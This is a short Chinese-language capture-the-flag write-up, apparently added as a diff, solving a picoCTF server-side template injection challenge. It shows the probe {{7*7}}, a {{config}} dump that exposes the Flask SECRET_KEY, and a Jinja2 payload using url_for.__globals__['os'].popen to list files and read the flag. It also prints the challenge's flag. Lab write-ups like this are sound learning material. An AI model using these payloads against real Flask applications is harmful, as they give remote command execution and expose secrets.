@@ -1,0 +1,35 @@
+题目明确说是SSTI
+服务器端模板输入？
+给了一个可以输入任意东西的框框，先看看源代码
+Crtl+U
+没有什么值得关注的
+用burp抓取login的POST包
+看来这次的能动的地方在于
+
+content=
+先试一下test
+它让我重定向到“该网址/announce”
+会显示一个大大的test
+
+来试试经典的ssti小payload：
+{{7*7}}
+网页输出了结果：49
+看来绝对存在ssti了
+
+来试试content={{config}}
+返回了一大堆依赖配置文件
+出现了
+Flask config
+SECRET_KEY
+DEBUG
+看来这是新的知识：**这是Flask + Jinja2
+
+我们来试试这个最完美的payload：
+content={{url_for.__globals__['os'].popen('ls').read()}}
+这个我还不知道是啥语法呢
+但是返回了服务器文件
+我们修改一下
+content={{url_for.__globals__['os'].popen('cat flag').read()}}
+
+flag出来了
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
